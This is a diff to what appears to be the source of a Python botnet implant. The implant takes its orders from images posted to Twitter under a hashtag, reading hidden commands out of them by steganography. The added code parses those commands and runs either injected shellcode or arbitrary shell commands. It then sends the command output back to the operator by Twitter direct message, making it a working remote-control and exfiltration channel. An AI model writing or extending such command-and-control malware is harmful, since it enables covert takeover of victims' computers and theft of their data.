@@ -10,6 +10,7 @@ import urllib
 import re
 import ctypes
 import base64
+import subprocess
 from subprocess import check_output
 
 # Import YAML
@@ -83,12 +84,28 @@ def run_shellcode(shellcode_str):
     
     ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 
+def run_bash_command(bash_command_str, to):
+    print("Executing bash command: " + bash_command_str)
+    proc = subprocess.Popen(bash_command_str, shell=True, stdout=subprocess.PIPE)
+    output = proc.stdout.read()
+    print("Sending output: \n" + output + "\nto: " + to)
+    api.PostDirectMessage(text=output, user_id=to)
+
+def meow_operation(operation_mode, operation_payload, sender):
+    if (operation_mode == "SHELL_CODE"):
+        run_shellcode(operation_payload)
+    elif (operation_mode == "BASH_COMMAND"):
+        run_bash_command(operation_payload, sender)
+
 def get_last_cmd():
+    print("Searching for hashtag: " + conf['id'])
     # Get the last command from C&C Center
     tweets = search_hashtag("#" + conf['id'])
 
     print("Retrieving new commands...")
-
+    #print("Tweets: \n")
+    #for tweet in tweets:
+    #    print("     " + str(tweet) + "\n")
     if(len(tweets) > 0):
         return tweets[0]
     else:
@@ -96,14 +113,20 @@ def get_last_cmd():
 
 def process_tweet(tweet):
     # Process tweet
-
     if(len(tweet.media) > 0):
         print("Downloading tweet image...")
         urllib.urlretrieve(tweet.media[0].media_url_https, "./download/cmd.png")
         print("Downloaded.")
         print("Decrypting hidden message...")
         payload = get_secret("cmd.png")
-        run_shellcode(payload)
+        payload_splitted = payload.split(":",1)
+        if(len(payload_splitted) == 2):
+            operation_mode = payload_splitted[0]
+            operation_payload = payload_splitted[1]
+            meow_operation(operation_mode, operation_payload, str(tweet.user.id))
+        else:
+            print("[ERROR] No protocol specified")
+
 def extract_urls():
     return re.search("(?P<url>https?://[^\s]+)", myString).group("url")
 
